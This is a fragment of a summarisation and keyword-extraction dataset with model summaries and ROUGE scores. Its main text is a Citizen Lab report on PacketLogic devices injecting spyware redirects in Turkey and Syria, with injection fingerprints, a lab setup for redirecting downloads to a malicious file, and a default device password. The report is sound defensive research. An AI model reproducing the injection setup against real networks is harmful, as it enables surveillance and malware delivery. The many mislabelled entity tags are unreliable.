attacks; government agencies; China; the attacks; targeted attacks; techniques; targets; the threat actors; government actors; export; social engineering techniques; the vulnerability; NGOs; the macros; targets; vulnerabilities; Security; a-tack vectors.", "ref_text": "<START-1>The paper analyzes targeted cyberattacks against a human rights NGO representing the Uyghur minority in China. The authors examined 1,493 suspicious emails received by two NGO volunteers over 4 years. They found the emails were highly tailored in language and topic to the victims, with most written in their native Uyghur language. Senders were often impersonated, including compromised accounts of high-profile activists. While recent studies found executables and archives were common attack vectors, this study found malicious Office documents were most prevalent. The documents exploited recent but disclosed vulnerabilities that tended to bypass defenses. No zero-days were observed. Analysis of the malware payloads revealed the NGO was targeted by different families over time. Over a quarter exhibited similarities to malware linked to targeted attacks against political, industrial, and Tibetan groups by known threat actors. The study shows the value of tracking old indicators of compromise across campaigns. It provides an in-depth look at social engineering and attack vectors used in the reconnaissance phase before a compromise. The authors released the malware dataset to further research on targeted attacks.<END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5670731707317073, "gpt3/lexical/rouge_rouge2": 0.23312883435582823, "gpt3/lexical/rouge_rougeL": 0.3780487804878048, "gpt3/lexical/rouge_rougeLsum": 0.3780487804878048, "gpt3_generated_text": ["This article presents an empirical analysis of targeted attacks against a human rights NGO representing a minority living in China. The study examines the social engineering techniques, attack vectors, and malware used in malicious emails received by two members of the NGO over a four-year period. The analysis reveals that the emails were highly tailored to the victims, with sender impersonation commonly used to lure them into opening malicious attachments. The majority of attacks employed malicious documents with recent but disclosed vulnerabilities that evade common defenses. The NGO received malware from different families, with over a quarter of the malware linked to entities reported to engage in targeted attacks against political and industrial organizations, as well as Tibetan NGOs. The article highlights the increasing sophistication and effectiveness of targeted attacks, emphasizing the need for improved security measures to protect individuals and organizations from these threats."]}, {"split_name": "val", "sample_id": "val_87", "prompt_text": "Extract the keywords: 6/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?BAD [PERSON] TRAFFIC [PERSON] Sandvine \u2019s [PERSON] PacketLogic [PERSON] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Affiliate Ads?citizenlab.ca/2018/03 / bad - traffic - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syriaBill Marczak , [PERSON] Jakub [PERSON] Dalek , [PERSON] Sarah [PERSON] McKune , [PERSON] Adam [PERSON] Senft , [PERSON] John Scott - Railton , [PERSON] Ron [PERSON] DeibertMarch [PERSON] 9 , 2018This report describes our investigation into the apparent use of [ORG] Sandvine / [ORG] Procera [ORG] Networks [ORG] Deep [ORG] Packet [ORG] Inspection ( DPI ) devices to deliver nation - state malware in [GPE] Turkey and indirectly into [GPE] Syria , and to covertly raise money through affiliate ads and cryptocurrency mining in [GPE] Egypt . Key FindingsThrough Internet scanning , we found deep packet inspection ( DPI ) middleboxes on [ORG] T\u00fcrk [ORG] Telekom \u2019s network . The middleboxes were being used to redirect [CARDINAL] hundreds of users in [GPE] Turkey and [GPE] Syria to nation - state spyware when those users attempted to download certain legitimate Windows applications . We found similar middleboxes at a [ORG] Telecom [ORG] Egypt demarcation point . On a number of occasions , the middleboxes were apparently being used to hijack [NORP] Egyptian Internet users \u2019 unencrypted web connections en masse , and redirect the users to revenue - generating content such as affiliate ads and browser cryptocurrency mining scripts . After an extensive investigation , we matched characteristics of the network injection in [GPE] Turkey and [GPE] Egypt to Sandvine PacketLogic devices . We developed a fingerprint for the injection we found in [GPE] Turkey , [GPE] Syria , and [GPE] Egypt and matched our fingerprint to a [ORDINAL] second - hand [PRODUCT] PacketLogic device that we procured and measured in a lab setting . The apparent use of [NORP] Sandvine devices to surreptitiously inject malicious and dubious redirects for users in [GPE] Turkey , [GPE] Syria , and [GPE] Egypt raises significant human rights concerns.1 . SummaryThis report describes how we used Internet scanning to uncover the apparent use of [ORG] Sandvine / [ORG] Procera [ORG] Networks [ORG] Deep [ORG] Packet [ORG] Inspection ( DPI ) devices ( i.e. middleboxes ) for malicious or dubious ends , likely by nation - states or ISPs in [CARDINAL] two countries.1.1 . TurkeyWe found that a series of middleboxes on [ORG] T\u00fcrk [ORG] Telekom \u2019s network were being used to redirect [CARDINAL] hundreds of users attempting to download certain legitimate programs to versions of those programs bundled with spyware . The spyware we found bundled byurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/1/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?operators was similar to that used in the StrongPity APT attacks . Before switching to the [ORG] StrongPity spyware , the operators of the [GPE] Turkey injection used the [ORG] FinFisher \u201c lawful intercept \u201d spyware , which [ORG] FinFisher asserts is sold only to government entities . Targeted users in [GPE] Turkey and [GPE] Syria who downloaded Windows applications from official vendor websites including [LOC] Avast [LOC] Antivirus , [PERSON] CCleaner , [ORG] Opera , and 7 - Zip were silently redirected to malicious versions by way of injected HTTP redirects . This redirection was possible because official websites for these programs , even though they might have supported [ORG] HTTPS , directed users to non - [PERSON] HTTPS downloads by default . Additionally , targeted users in [GPE] Turkey and [GPE] Syria who downloaded a wide range of applications from [ORG] CBS Interactive \u2019s Download.com ( a platform featured by [ORG] CNET to download software ) were instead redirected to versions containing spyware . [ORG] Download.com does not appear to support [ORG] HTTPS despite purporting to offer \u201c secure download \u201d links . [CARDINAL] 1Our scans of [GPE] Turkey revealed that this spyware injection was happening in [CARDINAL] at [CARDINAL] least [CARDINAL] five provinces . In addition to targets in [GPE] Turkey , targets included some users physically located in [GPE] Syria who used Internet services relayed into [GPE] Syria by [ORG] T\u00fcrk [ORG] Telekom subscribers , sometimes via cross - border directional Wi - Fi links . In [CARDINAL] one case , [CARDINAL] more [CARDINAL] than [CARDINAL] a [CARDINAL] hundred [NORP] Syrian users appeared to share a single [ORG] Turkish [ORG] IP address . Based on publicly available information we found on Wi - Fi router pages , [CARDINAL] at [CARDINAL] least [CARDINAL] one targeted [ORG] IP address appears to serve [GPE] YPG ( [NORP] Kurdish militia ) users . [ORG] YPG has been the target of a [NORP] Turkish government air and ground offensive which began in [DATE] January [DATE] 2018 . Areas not controlled by the [ORG] YPG also appear to be targeted , including the area around [ORG] Idlib city.1.2 . [ORG] EgyptWe found similar middleboxes at a [ORG] Telecom [ORG] Egypt demarcation point . The middleboxes were being used to redirect users across [CARDINAL] dozens of ISPs to affiliate ads and browser cryptocurrency mining scripts . The [NORP] Egyptian scheme , which we call AdHose , has [CARDINAL] two modes . In spray mode , [ORG] AdHose redirects [NORP] Egyptian users en masse to ads for short periods of time . In trickle mode , [ORG] AdHose targets some [ORG] JavaScript resources and defunct websites for ad injection . AdHose is likely an effort to covertly raise money.1.3 . Technology [PERSON] Matches [PERSON] Sandvine PacketLogicAfter an extensive investigation , we matched characteristics of the middleboxes in [GPE] Turkey and [GPE] Egypt to Sandvine PacketLogic devices . [PERSON] Sandvine \u2019s [PERSON] PacketLogic middleboxes can prioritize , degrade , block , inject , and log various types of Internet traffic . The company that makes [ORG] PacketLogic devices was formerly known as [ORG] Procera [ORG] Networks , but was recently renamed [PERSON] Sandvine after [ORG] Procera \u2019s owner , U.S.-based private equity firm [ORG] Francisco [ORG] Partners , acquired [GPE] Ontario - based networking equipment company [NORP] Sandvine and combined the [CARDINAL] two companies in [DATE] 2017 . [ORG] Francisco [ORG] Partners has a number of investments in dual - use technology companies , including providers of [GPE] Interneturl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/2/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate [ORG] Ads?surveillance and monitoring tools such as [ORG] NSO [ORG] Group , an [NORP] Israeli company that develops and sells mobile spyware . [ORG] NSO [ORG] Group \u2019s spyware has been used in several countries to target journalists , lawyers , and human rights defenders . A [DATE] 2014 article in a [ORG] Turkish [ORG] Newspaper mentioned that [GPE] Turkey had begun negotiations with [ORG] Procera to buy a [PRODUCT] PacketLogic system for surveillance and censorship purposes ; the deal reportedly caused consternation within the company.1.4 . Blocking Human Rights and [PERSON] Political [PERSON] ContentIn [PERSON] Egypt and [GPE] Turkey , we also found that devices matching our [PERSON] Sandvine [PERSON] PacketLogic fingerprint were being used to block political , journalistic , and human rights content . In [GPE] Egypt , these devices were being used to block [CARDINAL] dozens of human rights , political , and news websites including [ORG] Human [ORG] Rights [ORG] Watch , Reporters Without Borders , [ORG] Al [ORG] Jazeera , [PERSON] Mada [PERSON] Masr , and HuffPost [LANGUAGE] Arabic . In [GPE] Turkey , these devices were being used to block websites including [ORG] Wikipedia , the website of [ORG] the [ORG] Dutch [ORG] Broadcast [ORG] Foundation ( [ORG] NOS ) , and the website of [ORG] the [ORG] Kurdistan [ORG] Workers \u2019 [ORG] Party ( PKK).1.5 . [ORG] Procera / [ORG] Sandvine employees on the ground?A search of [NORP] LinkedIn reveals profiles for a Procera Networks \u201c Solutions Engineer \u201d in [GPE] Istanbul , [GPE] Turkey and a [GPE] Sandvine ( formerly [ORG] Procera [ORG] Networks ) \u201c Resident Engineer \u2013 Senior Level \u201d in [GPE] Egypt . Sandvine \u2019s \u201c Careers \u201d page describes the responsibilities of a position entitled \u201c Resident Operations Engineer , \u201d including \u201c performing operations based activities , residing at the customer \u2019s location , \u201d and \u201c working closely with the customers \u2019 operations and development teams . \u201d A [DATE] 2016 Procera \u201c use cases \u201d brochure [CARDINAL] 2 has a section on \u201c [WORK_OF_ART] Regulatory [WORK_OF_ART] Compliance [WORK_OF_ART] \u2013 [WORK_OF_ART] Traffic [WORK_OF_ART] Blocking , \u201d which mentions that the company provides \u201c resident engineering services \u201d to support government mandates on [ORG] Procera \u2019s customers that require blocking of services like VPNs or [FAC] VoIP . In light of this information , on [DATE] February [DATE] 12 , [DATE] 2018 , we sent a letter to [GPE] Sandvine and asked whether [PERSON] Sandvine maintains a resident solutions engineer or other support staff in [GPE] Turkey or [GPE] Egypt . Sandvine did not respond to this question . The prospect of in - country work of this sort , especially at the large [ORG] ISP level , raises questions regarding company awareness of , or participation in , activities with significant human rights impact . Our [DATE] February [DATE] 12 , [DATE] 2018 letters to [GPE] Sandvine and Francisco Partners summarized the findings of our report and contained detailed questions about our findings and their corporate social responsibility practices . A [DATE] February [DATE] 16 , [DATE] 2018 letter from [GPE] Sandvine characterized the statements in our letter as \u201c false , misleading , and wrong , \u201d and demanded that we return the [ORDINAL] second - hand [PRODUCT] PacketLogic device that we used to confirm attribution of our fingerprint . On [DATE] February [DATE] 20 , [DATE] 2018 , [ORG] Francisco [ORG] Partners sent its own response , stating that the firm \u201c recognizes the importance of corporate governance and social responsibility . \u201d On [DATE] March [DATE] 1 , [DATE] 2018 , [PERSON] Citizen [PERSON] Lab replied to [GPE] Sandvine . Our interactions with [GPE] Sandvine and Francisco Partners are discussed in further detail in [LAW] Section 7.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/3/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?2 . Background : Nation - State [ORG] Network InjectionNation - state - level network injection to deliver spyware has long been the stuff of legends . There have been many leaked documents and vendor claims outlining purported nation- state network injection capabilities but there are no concrete public measurements that conclusively establish nation - state spyware injection in the wild . In network injection , a middlebox operates over connections between a target and an Internet site they are visiting . If the connection is unauthenticated ( e.g. , HTTP and not HTTPS ) , then the middlebox can be used to tamper with data to inject a spoofed response from the Internet site . The spoofed response may contain redirects to exploits or spyware to infect and monitor the target . A significant portion of web traffic ( [PERCENT] approximately [PERCENT] 20- 30 % in [GPE] the [GPE] United [GPE] States ) still does not use [ORG] HTTPS , according to Google . Broadly , network injection systems are divided into [CARDINAL] two categories : an on - path system ( also called a man - on - the - side ) can simply add Internet traffic to the network , whereas an in - path system ( also called a man - in - the - middle ) can add traffic and also suppress legitimate traffic . A malicious response injected by an on - path system is easier for researchers to detect , because the target receives both the legitimate and malicious response . The presence of [CARDINAL] two non - similar responses to the same request is a good indicator of on - path network injection . The target \u2019s device will process whichever response is received [ORDINAL] first , so the goal of an on - path system is to inject a malicious response that reaches the user before the legitimate response . However , such a system can not always guarantee that the target \u2019s device will see the malicious response [ORDINAL] first , due to unpredictable network delays and reordering.2.1 . On - Path SystemsNSA QUANTUMBased on information from documents leaked from [ORG] the [ORG] US [ORG] National [ORG] Security [ORG] Agency ( [ORG] NSA ) , [ORG] NSA \u2019s [ORG] QUANTUM is an on - path network injection system , and has been used to target engineers associated with [NORP] Belgian telco [ORG] Belgacom , employees of [ORG] OPEC , and Tor users accessing terrorist content . [ORG] NSA \u2019s [ORG] QUANTUM has never been publicly measured in the wild , but leaked documents indicate that it functions by injecting HTTP redirects into targeted users \u2019 connections . [ORG] Hacking [ORG] Team [ORG] Network [ORG] Injection [ORG] Appliance ( NIA)According to a patent filed in [DATE] 2010 by nation - state spyware vendor [ORG] Hacking [ORG] Team , and leaked documents , the company may have developed a similar on - path network injection system called [ORG] the [ORG] Hacking [ORG] Team [ORG] Network [ORG] Injection [ORG] Appliance ( NIA ) . This system has never been publicly measured in the wild . The patent indicates that the NIA functions by injecting HTTP redirects into targeted users \u2019 connections.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/4/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate Ads?2.2 . In - Path SystemsFinFly ISPLeaked documents from nation - state spyware vendor [PERSON] FinFisher indicate that the company sells an in - path network injection system called [PRODUCT] FinFly [PRODUCT] ISP . The complex system supports a number of unique features , such as rewriting downloaded binaries on- the - fly . The system was apparently sold to governments in [GPE] Mongolia and [GPE] Turkmenistan , and [CARDINAL] at [CARDINAL] least [CARDINAL] one additional customer that could not be identified from the [DATE] 2014 FinFisher leaked documents . This system has never been publicly measured in the wild . [GPE] China \u2019s Great CannonChina \u2019s Great Cannon is an in - path network injection system , which was used in [DATE] 2015 ( and perhaps as recently as [DATE] 2017 ) to inject JavaScript that enlists targets \u2019 browsers in distributed denial of service ( DDoS ) attacks against the [NORP] Chinese diaspora \u2019s efforts to spread censored information . In a [DATE] 2015 report , we hypothesized that [FAC] the [FAC] Great [FAC] Cannon could also be used to distribute spyware , but this has never been publicly measured in the wild . [PERSON] Sandvine PacketLogicAccording to our measurements ( [LAW] Section [LAW] 3.3 ) , [ORG] Sandvine \u2019s [ORG] PacketLogic product supports in - path network injection . The company advertises that they support \u201c regulatory compliance \u201d but does not mention spyware injection . Nevertheless , the product has support for defining rules that inject data into targeted connections ( Figure [CARDINAL] 4 ) . As we document in this report , the [ORG] PacketLogic product may have been used by government- linked entities in both [GPE] Turkey and [GPE] Egypt to inject spyware.2.3 . The Procera / Sandvine value proposition3A Procera \u201c use cases \u201d brochure has a section on \u201c [WORK_OF_ART] Regulatory [WORK_OF_ART] Compliance [WORK_OF_ART] \u2013 [WORK_OF_ART] Traffic [WORK_OF_ART] Blocking . \u201d The section links to a [DATE] 2002 article by [ORG] Electronic [ORG] Frontiers [ORG] Australia entitled \u201c [WORK_OF_ART] Internet [WORK_OF_ART] Censorship : [WORK_OF_ART] Law [WORK_OF_ART] & policy around the world \u201d and mentions that \u201c [ORG] Procera \u2019s solutions provide the capabilities to identify and block , or shape down to become unusable , any identifiable service network wide or on an individual subscriber basis . \u201dProcera appears to have pitched its services as a win - win for both ISPs and governments that require Internet censorship solutions , or as a way for ISPs to save money while implementing regulatory requirements that do not generate any revenue:\u201cOperators that are required to filter content from their networks by governmental regulations are struggling to find solutions that can keep up with the explosive bandwidth growth of [DATE] the [DATE] past [DATE] few [DATE] years . Many telecom operators are required to invest several racksurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/5/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?worth of equipment for a single use case with no return on investment through additional [ORG] ARPU from subscribers . \u201dThe document describes the close ongoing relationship [ORG] Procera may have maintained with its clients to help them implement \u201c regulatory requirements , \u201d in some cases apparently having a [ORG] Procera employee assist government clients with censorship:\u201cAs an example , adult content can be opted in on an individual bases [ sic ] or services like [ORG] Skype could be enabled for corporate clients only . [ORG] Procera updates it \u2019s [ sic ] signature database on a [DATE] weekly basis to stay up to date on changes in what traffic looks like . Blocking proprietary over - the - top services will always remain a cat and mouse game that requires local dedicated personnel to perform well . Procera can provide these resident engineering services . \u201dSandvine appears to offer instructor - led training sessions , such as the \u201c [WORK_OF_ART] Operating [WORK_OF_ART] with [WORK_OF_ART] PacketLogic \u201d course . If desired , [GPE] Sandvine can offer such courses as a \u201c customer - exclusive session delivered at the customer \u2019s location\u201c.3 . Catching Nation - State spyware injection in the wildThis section describes how we obtained the [ORDINAL] first - ever packet captures ( PCAPs ) of nation- state spyware injection , and how we matched the characteristics of the spyware injection to [PERSON] Sandvine [PERSON] PacketLogic devices.3.1 . An initial reportA [DATE] September [DATE] 2017 report revealed that ISPs in [CARDINAL] two ( unnamed ) countries were likely injecting [ORG] FinFisher spyware into targeted users \u2019 Internet connections when the users tried to download popular Windows applications . The injection was implemented using [ORG] HTTP redirects matching the format shown in Figure [CARDINAL] 1.HTTP/1.1 307 Temporary Redirect Location : [ location ] Connection : closeFigure [CARDINAL] 1 : Injected HTTP [CARDINAL] 307 redirect to spyware seen in [CARDINAL] two countries . A follow - up report in [DATE] December [DATE] 2017 found no further evidence of spyware injection from [CARDINAL] one of the [CARDINAL] two countries from the original report and found that operators of the injection in the [ORDINAL] second country switched from [ORG] FinFisher spyware to a piece of spyware that was similar to the [ORG] StrongPity spyware . StrongPity was an unattributed [ORG] APT operation in [DATE] 2016 that primarily targeted individuals in [GPE] Italy and Turkey.3.2 . Scanning and identifying countriesurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/6/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate [PERSON] Ads?Discovering that an [ORG] ISP or government is tampering with a user \u2019s Internet connection by injecting malicious responses to the user \u2019s requests is difficult . Typically , this requires the user to send requests , record the responses they receive , and share this data with researchers . However , we find that some network injection is bidirectional : we can sometimes receive a malicious injected response when we send a request to a targeted user . We checked [GPE] Shodan , a website on which anyone can search the results of global Internet scans , for the header format in Figure [CARDINAL] 1 , and found [CARDINAL] thousands of [ORG] IP addresses in [CARDINAL] dozens of countries returning similar ( non - malicious ) redirects , sometimes to landing pages about billing like \u201c Your Internet service has been suspended for non - payment . \u201d It seemed peculiar to us that Shodan saw these messages when it scanned the [ORG] IP address of a customer who was suspended for non - payment , because the messages would only need to be visible to the customer themself . The fact that Shodan received responses from [CARDINAL] thousands of [ORG] IP addresses matching the same header format used to inject [ORG] FinFisher spyware in [CARDINAL] two countries ( Figure [CARDINAL] 1 ) suggested to us that the spyware injection might also be bidirectional.4We scanned the Internet in [DATE] October [DATE] 2017 , sending every IPv4 address an HTTP request to download the [ORG] Opera Web Browser , one of the applications that a [DATE] September [DATE] 2017 report indicates was targeted for spyware injection . Our initial scan found [CARDINAL] dozens of [ORG] IP addresses on [PERSON] T\u00fcrk [PERSON] Telekom that returned [CARDINAL] 307 redirects such as the ones in Figure [CARDINAL] 2.HTTP/1.1 307 Temporary Redirect Location : url Connection : closeHTTP/1.1 307 Temporary Redirect Location : url Connection : closeFigure [CARDINAL] 2 : Injected HTTP [CARDINAL] 307 spyware redirects we observed in [GPE] Turkey when performing HTTP requests for [ORG] Opera . We successfully fetched the files from a [NORP] Turkish IP address using a [ORG] VPN . When we tried to fetch the files from a non - [NORP] Turkish [NORP] IP , we received a [CARDINAL] 503 Service Temporarily Unavailable message . The files were similar to the [ORG] StrongPity spyware . 5We continued to perform scanning of [GPE] Turkey and set out to fingerprint the middlebox performing the spyware injection . As part of our scanning , we obtained packet captures ( PCAPs ) that show network - level details of the spyware injection . These are the [ORDINAL] first ever public PCAPs showing nation - state spyware injection.3.3 . Attribution of middlebox to [GPE] Sandvineurl\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/7/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Fingerprint elementsBased on our PCAPs , we identified several elements of the injection in [GPE] Turkey which , in conjunction , form what we believe to be a highly distinctive fingerprint:1 . In all injected packets , the [ORG] IPID is always [DATE] 13330 ( 0x3412 , which is [CARDINAL] 0x1234endian - swapped ) for all injected packets . This value is unusual , as the [ORG] IPID is typically incremented or pseudorandomly generated , and is not a fixed value . [CARDINAL] 2 . In all packets , the [ORG] IP flags are all zero . This characteristic is unusual asmodern [ORG] TCP stacks typically default - enable Path MTU Discovery for [ORG] TCP sockets , which results in the \u201c do n\u2019t fragment \u201d IP flag being set to [CARDINAL] 1.3 . The injected packet received by the client is either an empty RST / ACKpacket , or a [ORG] FIN / [ORG] ACK packet , with an [LAW] HTTP [LAW] 307 redirect whose headers exactly match the form of redirect in Figure [CARDINAL] 1.4 . If a [ORG] FIN / [ORG] ACK is injected , then the injector sends an unsolicited final [ORG] ACK packet to the client ~100ms later . This behavior is unusual , as a well- behaving [ORG] TCP stack would wait to see the FIN / ACK from the client before sending the final ACK.Given the well - documented controversy over the installation of [ORG] Sandvine [ORG] PacketLogic devices in [GPE] Turkey , we purchased a [PRODUCT] PacketLogic device [ORDINAL] second - hand to confirm whether its behavior matched our fingerprint . Our [ORDINAL] second - hand [ORG] PacketLogic deviceWe purchased a [ORG] Sandvine [ORG] PacketLogic device [ORDINAL] second - hand . The device was a [PRODUCT] PacketLogic [PRODUCT] PL7720 , which is a [CARDINAL] 2U rackmount version of [ORG] PacketLogic with Procera livery . This model is well past its designated end - of - life date and no longer serviced by the company . The device was installed with firmware version [CARDINAL] 12.1 , which was released in [DATE] 2009 . The device also contained a [ORG] PacketLogic license file that appeared to be valid in perpetuity for the currently installed version of the firmware but which can not be used to upgrade to a later version . Version [CARDINAL] 12.1 appears to be the earliest version of [PRODUCT] PacketLogic firmware to contain support for network injection.6Figure [CARDINAL] 3 : A picture of our [ORDINAL] second - hand [PERSON] Sandvine [PERSON] PacketLogic box , with [ORG] Procera livery.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/8/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [PERSON] Af\ufb01liate Ads?The device has [CARDINAL] two [ORG] USB ports , an [ORG] RS232 ( on [ORG] RJ45 ) serial console port that can be used to access a text - based menu configuration system , [CARDINAL] two management ethernet ports , and a single channel over which the middlebox operates . The channel has an internal ethernet port ( Int ) and an external ethernet port ( [ORG] Ext ) . The middlebox would typically operate over traffic flowing between a local network ( connected to the [ORG] Int port ) , and the rest of the Internet ( connected to the [NORP] Ext port ) . An operator could add rules to the middlebox to take certain actions over this traffic ( e.g. , block traffic to a website , inject traffic for targeted users , [CARDINAL] etc.).We powered up the device and connected through its [ORG] Admin management port . We used an old version of [ORG] the [ORG] PacketLogic [ORG] Client available on the Internet Archive to interface with the device , as no current version of [ORG] the [ORG] PacketLogic [ORG] Client on Sandvine \u2019s website appeared to support version [CARDINAL] 12.1 of the firmware . We used the default password \u201c pldemo00 \u201d printed on the device to log in . We connected [CARDINAL] one experiment computer to the [ORG] PacketLogic device \u2019s [PRODUCT] Ext port , and a [ORDINAL] second experiment computer to the [ORG] Int port in order to observe characteristics of the device \u2019s operation . At no time did we connect the device to the Internet . Redirecting users to a malicious fileWe added a rule to redirect users who requested an [LOC] Avast [LOC] Antivirus setup file to a malicious file . This test involved creating a PropertyObject to match requests whose URL ended in the filename for [WORK_OF_ART] Avast [WORK_OF_ART] Antivirus : [GPE] avast_free_antivirus_setup_online.exe , and then a Filtering Rule to redirect all connections matching the PropertyObject to a malicious file . This redirection used the built - in Inject action . The PacketLogic GUI has an \u201c [WORK_OF_ART] Insert [WORK_OF_ART] 307 [WORK_OF_ART] Temporary [WORK_OF_ART] Redirect \u201d button that , when pressed , pastes an [LAW] HTTP [LAW] 307 [LAW] Temporary [LAW] Redirect response identical to element [CARDINAL] 3 of our fingerprint ( at the start of this section ) . The [ORG] PacketLogic operator can configure the \u201c Location \u201d header , which is initially blank ; in this case , we entered : url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/9/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to Af\ufb01liate Ads?Figure 4 : How we set up our [PERSON] Sandvine [PERSON] PacketLogic device to inject spyware when a usertries to download [LOC] Avast [LOC] Antivirus . We believe a similar setup exists in [GPE] Turkey . Without any further configuration , this rule caused our [ORG] PacketLogic device to inject the redirect in response to a matching request in either direction ( internal to external , or external to internal ) . This mirrors our experience of being able to reproduce spyware injection in [GPE] Turkey from requests sent external to internal . We noticed that we could add an extra condition to the rule in order to restrict the injection to a single direction . Our experiment matched elements [CARDINAL] 1 - [CARDINAL] 3 of our fingerprint , but did not completely match element [DATE] 4 . Specifically , our [ORG] PacketLogic middlebox injected an unsolicited final [ORG] ACK back - to - back after the [ORG] FIN / [ORG] ACK containing [PRODUCT] the [PRODUCT] 307 [PRODUCT] Temporary [PRODUCT] Redirect instead of injecting it following the ~100ms delay we observed in [GPE] Turkey and [GPE] Egypt . Our version of the [ORG] PacketLogic firmware ( [CARDINAL] 12.1 ) was the [ORDINAL] first to support injection ; we hypothesize that the ~100ms delay between the data packet and the final [ORG] ACK was added in a later firmware version , potentially to reduce the probability of the [ORG] ACK being reordered before the [ORG] FIN / [ORG] ACK ; such a reordering would cause the injection recipient \u2019s TCP connection to hang in the [GPE] LAST_ACK state , which is the scenario that sending the [ORG] ACK seeks to avoid . Figure [CARDINAL] 5 shows an excerpt from our client - side PCAP that captures the injection from our test PacketLogic device . Note that the [ORG] IPID is [DATE] 13330 in both injected packets , both injected packets have no IP flags , the format of the HTTP [CARDINAL] 307 redirect is what we expect , and the final [ORG] ACK packet is unsolicited . Client sends GET request for [NORP] Avast [NORP] file17:28:25.024018 [NORP] IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 0 , offset 0 , flags [ DF ] , proto [ORG] TCP ( [CARDINAL] 6 ) , length [CARDINAL] 170 ) [ nop , nop , TS val [CARDINAL] 756363711 ecr [CARDINAL] 2094486068 ] , length [CARDINAL] 118 : HTTP , length : [CARDINAL] 118 User - Agent : curl/7.54.0 Accept : * /*Client receives injected data ( redirect to spyware file)17:28:25.024300 [ORG] IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 13330 , offset 0 , flags [ none ] , proto [ORG] TCP ( [CARDINAL] 6 ) , length [CARDINAL] 134 ) [CARDINAL] 94 : HTTP , length : [CARDINAL] 94 [PRODUCT] HTTP/1.1 [PRODUCT] 307 [PRODUCT] Temporary [PRODUCT] Redirect [PRODUCT] Location : [PRODUCT] url Connection : [PRODUCT] closeClient receives injected ACK17:28:25.024302 IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 13330 , offset 0 , flags [ none ] , proto [ORG] TCP ( [CARDINAL] 6 ) , length [CARDINAL] 40 ) our test PacketLogic device . Note that the server side does not receive the HTTP request for the [LOC] Avast file . Instead , it receives an injected RST packet with [ORG] IPID [DATE] 13330 and no flags . Note that the timestamp discrepancy in the [ORG] PCAP files is because the server and client clocks were not synchronized . Server receives injected RST17:28:06.715257 [ORG] IP ( tos [CARDINAL] 0x0 , ttl [DATE] 64 , i d 13330 , offset 0 , flags [ none ] , proto [ORG] TCP ( [CARDINAL] 6 ) , length [CARDINAL] 40 ) distinctive implementation choices as [ORG] PacketLogic \u2019s was used in the injection in [GPE] Turkey and [GPE] Egypt . It is possible that another vendor copied [ORG] PacketLogic \u2019s design , such as by studying and exactly re - implementing [ORG] PacketLogic \u2019s custom [ORG] TCP stack and HTTP header format in injected redirects . It is also possible that , with or without [GPE] Sandvine \u2019s knowledge , a [ORDINAL] third party obtained and copied [ORG] PacketLogic \u2019s code . It might also be possible that both [PERSON] Sandvine and other companies drew their code from the same [ORDINAL] third - party codebase.url\ufb01c - sandvines - packetlogic - devices - deploy - government - spyware - turkey - syria/11/386/30/2020BAD TRAFFIC : [ORG] Sandvine \u2019s [ORG] PacketLogic [ORG] Devices Used to Deploy Government Spyware in [GPE] Turkey and Redirect Egyptian Users to [ORG] Af\ufb01liate Ads?7There are , however , several reasons why the shared code hypothesis is unlikely to be an accurate explanation of our findings . [ORDINAL] First , the [DATE] 2016 controversy within [ORG] Procera about selling their solution to [GPE] Turkey for surveillance ( referred to in [LAW] Section [LAW] 1.3 ) indicates a possible prior business relationship between the company and [GPE] Turkey . [ORDINAL] Second , we have not been able to locate any codebase with both the same distinctive [ORG] IPID value and the same distinctive HTTP header format ; the only references to [ORG] IPID values of [DATE] 13330 ( 0x3412 ) we found were a [DATE] 2016 OONI report about the ad injection we mention in [LAW] Section 